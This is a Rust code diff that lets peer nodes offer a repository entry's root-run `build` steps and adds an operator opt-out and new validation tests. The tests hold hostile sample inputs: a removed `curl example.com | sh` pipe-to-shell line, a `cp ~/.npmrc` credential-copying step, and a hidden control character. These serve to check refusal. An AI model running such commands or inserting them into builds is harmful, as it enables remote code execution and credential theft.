@@ -40,11 +40,12 @@ const MAX_NAME_CHARS: usize = 40;
 
 /// The fields of a `[[repo]]` entry that are this node's alone and are never
 /// offered: kept as they are when an offer is accepted onto the entry.
-/// `build` runs as root on this node's pinned base, so a peer does not name it.
+/// `build` is offered: its steps run as root on the receiver's own pinned
+/// base, so the accept card shows them apart and the operator can keep the
+/// entry's own instead.
 pub const LOCAL_ONLY: &[&str] = &[
     "path",
     "image",
-    "build",
     "prepare_credentials",
     "commits",
     "style",
@@ -63,6 +64,11 @@ pub struct RepoRecipe {
     pub dockerfile: Option<String>,
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub context: Option<String>,
+    /// Build steps on the stock base, run as root when the image is built.
+    /// Sent only when the entry has some: a node from before they travelled
+    /// refuses a recipe that names them, and still takes one that does not.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub build: Vec<String>,
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub checks: Option<Vec<String>>,
     /// Sent only when the entry sets it: a node from before `warm` refuses
@@ -87,6 +93,10 @@ pub struct Choices {
     /// Keep lending the entry's `prepare_credentials` to a preparation the
     /// offer changes. Off unless asked for: see [`Credentials::Dropped`].
     pub keep_credentials: bool,
+    /// Write the offered build steps (when it carries any) in place of the
+    /// entry's own image source. On unless the operator unticks it; off, the
+    /// entry's `build` (or Dockerfile) is left exactly as it was.
+    pub apply_build: bool,
     /// Not the operator's choice but the entry's state: it is [`held`], so
     /// its preparation is a peer's the operator has not started, and an
     /// offer that leaves it as it is does not make it any less so.
@@ -160,6 +170,7 @@ impl RepoRecipe {
             repo: repo.to_string(),
             dockerfile: entry.dockerfile.clone(),
             context: entry.context.clone(),
+            build: entry.build.clone(),
             checks: entry.checks.clone(),
             warm: entry.warm.clone(),
             prepare: entry.prepare.clone(),
@@ -216,6 +227,7 @@ impl RepoRecipe {
             }
         }
         for (field, commands) in [
+            ("build", &self.build[..]),
             ("checks", self.checks.as_deref().unwrap_or_default()),
             ("warm", self.warm.as_deref().unwrap_or_default()),
             ("prepare", &self.prepare[..]),
@@ -260,6 +272,7 @@ impl RepoRecipe {
             path,
             dockerfile: self.dockerfile.clone(),
             context: self.context.clone(),
+            build: self.build.clone(),
             checks: self.checks.clone(),
             warm: self.warm.clone(),
             prepare: self.prepare.clone(),
@@ -272,7 +285,11 @@ impl RepoRecipe {
 
     /// `existing` (or a new entry at `path`) with this recipe applied. The
     /// fields in [`LOCAL_ONLY`] stay as the entry has them, with two
-    /// exceptions the operator controls. A recipe that names a Dockerfile
+    /// exceptions the operator controls. Offered build steps are written in
+    /// place of the entry's own image source unless `apply_build` is off
+    /// (then the entry's own is left exactly as it was), and like a
+    /// Dockerfile they replace an image this node pinned only when
+    /// `replace_image` says so. A recipe that names a Dockerfile
     /// replaces an image this node pinned only when `replace_image` says so
     /// (one that names none leaves the entry's own image source alone: its
     /// sender pins an image, which is never offered). And credentials the
@@ -290,6 +307,61 @@ impl RepoRecipe {
         entry.session_egress = self.session_egress;
         entry.timeout_secs = self.timeout_secs;
         let own_source = entry.image.is_some() || !entry.build.is_empty();
+        if !self.build.is_empty() {
+            self.apply_build(&mut entry, choices, &mut notes);
+        } else {
+            self.apply_dockerfile(&mut entry, own_source, choices, &mut notes);
+        }
+        self.settle(&was, existing, entry, choices, notes)
+    }
+
+    /// The offered build steps onto `entry`, as `choices` say.
+    fn apply_build(&self, entry: &mut Repo, choices: Choices, notes: &mut Vec<String>) {
+        if !choices.apply_build {
+            notes.push(
+                "The offered build steps are not applied: this entry keeps its own image source \
+                 as it is."
+                    .into(),
+            );
+            return;
+        }
+        if entry.image.is_some() && !choices.replace_image {
+            notes.push(
+                "This entry pins an image of its own, which it keeps; the offered build steps are \
+                 not applied unless the pinned image is replaced."
+                    .into(),
+            );
+            return;
+        }
+        if entry.image.take().is_some() {
+            notes.push(
+                "The pinned image is replaced: this node runs the offered build steps on its own \
+                 base and pins its own image."
+                    .into(),
+            );
+        }
+        if entry.dockerfile.take().is_some() {
+            entry.context = None;
+            notes.push(
+                "The Dockerfile is replaced: this node runs the offered build steps on its stock \
+                 base instead."
+                    .into(),
+            );
+        }
+        if !entry.build.is_empty() && entry.build != self.build {
+            notes.push("This entry's build steps are replaced by the offered ones.".into());
+        }
+        entry.build = self.build.clone();
+    }
+
+    /// The offered Dockerfile (or none) onto `entry`, as `choices` say.
+    fn apply_dockerfile(
+        &self,
+        entry: &mut Repo,
+        own_source: bool,
+        choices: Choices,
+        notes: &mut Vec<String>,
+    ) {
         match (&self.dockerfile, own_source) {
             (None, _) => {
                 if entry.image.is_some() || entry.dockerfile.is_some() || !entry.build.is_empty() {
@@ -328,6 +400,18 @@ impl RepoRecipe {
                 entry.context = self.context.clone();
             }
         }
+    }
+
+    /// What becomes of lent credentials, and which of the entry's own fields
+    /// it keeps, once the recipe is on `entry`.
+    fn settle(
+        &self,
+        was: &Repo,
+        existing: Option<&Repo>,
+        mut entry: Repo,
+        choices: Choices,
+        mut notes: Vec<String>,
+    ) -> Applied {
         let lent = entry.prepare_credentials.clone();
         let preparation_changed = was.prepare != entry.prepare
             || was.egress != entry.egress
@@ -367,13 +451,12 @@ impl RepoRecipe {
             ));
             Credentials::Dropped(lent)
         };
-        let kept = LOCAL_ONLY
+        let mut kept: Vec<&'static str> = LOCAL_ONLY
             .iter()
             .copied()
             .filter(|field| match *field {
                 "path" => existing.is_some(),
                 "image" => entry.image.is_some(),
-                "build" => !entry.build.is_empty(),
                 "prepare_credentials" => !entry.prepare_credentials.is_empty(),
                 "commits" => entry.commits.is_some(),
                 "style" => entry.style.is_some(),
@@ -381,6 +464,14 @@ impl RepoRecipe {
                 _ => false,
             })
             .collect();
+        // Build steps the entry has of its own, not the offered ones.
+        if !entry.build.is_empty() && entry.build != self.build {
+            let at = kept
+                .iter()
+                .take_while(|field| matches!(**field, "path" | "image"))
+                .count();
+            kept.insert(at, "build");
+        }
         Applied {
             entry,
             notes,
@@ -769,6 +860,7 @@ mod tests {
             repo: "github.com/acme/app".into(),
             dockerfile: Some("Dockerfile".into()),
             context: None,
+            build: Vec::new(),
             warm: None,
             checks: Some(vec!["just all".into()]),
             prepare: vec!["npm ci".into()],
@@ -781,6 +873,7 @@ mod tests {
     const KEEP_IMAGE: Choices = Choices {
         replace_image: false,
         keep_credentials: false,
+        apply_build: true,
         held: false,
     };
 
@@ -831,23 +924,39 @@ mod tests {
         assert!(fresh.kept.is_empty());
     }
 
-    /// Build steps run as root on this node's base: they are never offered
-    /// or taken from a peer, and an offered Dockerfile replaces them only when
-    /// the operator says so, never leaving an entry that names both.
+    /// Build steps travel with a recipe (left out when there are none, so an
+    /// older receiver still takes it), are held to what other commands are,
+    /// and an offered Dockerfile replaces the entry's own steps only when the
+    /// operator says so, never leaving an entry that names both.
     #[test]
-    fn build_steps_are_this_nodes_own() {
+    fn build_steps_travel_and_a_dockerfile_replaces_them_only_when_asked() {
         let mut mine = entry();
         mine.dockerfile = None;
         mine.context = None;
         mine.prepare_credentials.clear();
         mine.build = vec!["apt-get install -y jq".into()];
         let offer = RepoRecipe::from_entry(&mine, "github.com/acme/app");
-        assert!(serde_json::to_value(&offer).unwrap().get("build").is_none());
-        let mut carrying = serde_json::to_value(&offer).unwrap();
-        carrying["build"] = json!(["curl example.com | sh"]);
-        assert!(RepoRecipe::parse(&carrying)
-            .unwrap_err()
-            .contains("never shared"));
+        let wire = serde_json::to_value(&offer).unwrap();
+        assert_eq!(wire["build"], json!(["apt-get install -y jq"]));
+        assert_eq!(RepoRecipe::parse(&wire).unwrap(), offer);
+        let none = RepoRecipe::from_entry(&entry(), "github.com/acme/app");
+        assert!(serde_json::to_value(&none).unwrap().get("build").is_none());
+        for (step, why) in [
+            ("cp ~/.npmrc /etc/npmrc", "build names"),
+            ("apt-get install -y jq\u{202e}", "control or invisible"),
+            (" ", "empty command"),
+        ] {
+            let mut bad = offer.clone();
+            bad.build = vec![step.into()];
+            let refused = bad.validate().unwrap_err();
+            assert!(
+                refused.contains("build") && refused.contains(why),
+                "{step}: {refused}"
+            );
+        }
+        let mut both = offer.clone();
+        both.dockerfile = Some("Dockerfile".into());
+        assert!(both.validate().is_err());
 
         let kept = offered().apply(Some(&mine), mine.path.clone(), KEEP_IMAGE);
         assert_eq!(kept.entry.build, mine.build);
@@ -869,6 +978,80 @@ mod tests {
         assert!(changes(Some(&mine), &replaced.entry)
             .iter()
             .any(|change| change["field"] == "build"));
+    }
+
+    /// Offered build steps are written by default, onto a new entry or in
+    /// place of an entry's own Dockerfile or steps; opting out leaves the
+    /// entry's own exactly as they were; a pinned image is kept unless the
+    /// operator replaces it.
+    #[test]
+    fn offered_build_steps_apply_by_default_and_can_be_opted_out_of() {
+        let steps = vec![
+            "apt-get update".to_string(),
+            "apt-get install -y php8.5-gmp".into(),
+        ];
+        let offer = RepoRecipe {
+            dockerfile: None,
+            build: steps.clone(),
+            ..offered()
+        };
+        let fresh = offer.apply(None, "github.com/acme/app".into(), KEEP_IMAGE);
+        assert_eq!(fresh.entry.build, steps);
+        assert!(!fresh.kept.contains(&"build"));
+        crate::config::validate_repos(std::slice::from_ref(&fresh.entry)).unwrap();
+
+        let mut mine = entry();
+        mine.prepare_credentials.clear();
+        assert!(mine.dockerfile.is_some());
+        let onto = offer.apply(Some(&mine), mine.path.clone(), KEEP_IMAGE);
+        assert_eq!(onto.entry.build, steps);
+        assert_eq!(
+            (onto.entry.dockerfile.as_ref(), onto.entry.context.as_ref()),
+            (None, None)
+        );
+        assert!(onto
+            .notes
+            .iter()
+            .any(|n| n.contains("Dockerfile is replaced")));
+        crate::config::validate_repos(std::slice::from_ref(&onto.entry)).unwrap();
+
+        let opt_out = Choices {
+            apply_build: false,
+            ..KEEP_IMAGE
+        };
+        let kept = offer.apply(Some(&mine), mine.path.clone(), opt_out);
+        assert_eq!(kept.entry.build, mine.build);
+        assert_eq!(kept.entry.dockerfile, mine.dockerfile);
+        assert_eq!(kept.entry.context, mine.context);
+        assert!(kept.notes.iter().any(|n| n.contains("not applied")));
+        assert!(!changes(Some(&mine), &kept.entry)
+            .iter()
+            .any(|c| c["field"] == "build" || c["field"] == "dockerfile"));
+
+        let mut own_steps = mine.clone();
+        own_steps.dockerfile = None;
+        own_steps.context = None;
+        own_steps.build = vec!["apk add jq".into()];
+        let kept = offer.apply(Some(&own_steps), own_steps.path.clone(), opt_out);
+        assert_eq!(kept.entry.build, own_steps.build);
+        assert!(kept.kept.contains(&"build"));
+        let replaced = offer.apply(Some(&own_steps), own_steps.path.clone(), KEEP_IMAGE);
+        assert_eq!(replaced.entry.build, steps);
+
+        let mut pinned = own_steps.clone();
+        pinned.build.clear();
+        pinned.image = Some(format!("localhost/app@sha256:{}", "b".repeat(64)));
+        let kept = offer.apply(Some(&pinned), pinned.path.clone(), KEEP_IMAGE);
+        assert_eq!(kept.entry.image, pinned.image);
+        assert!(kept.entry.build.is_empty());
+        assert!(kept.notes.iter().any(|n| n.contains("pins an image")));
+        let replace = Choices {
+            replace_image: true,
+            ..KEEP_IMAGE
+        };
+        let replaced = offer.apply(Some(&pinned), pinned.path.clone(), replace);
+        assert_eq!(replaced.entry.image, None);
+        assert_eq!(replaced.entry.build, steps);
     }
 
     /// A peer that changes what preparation runs or reaches would choose
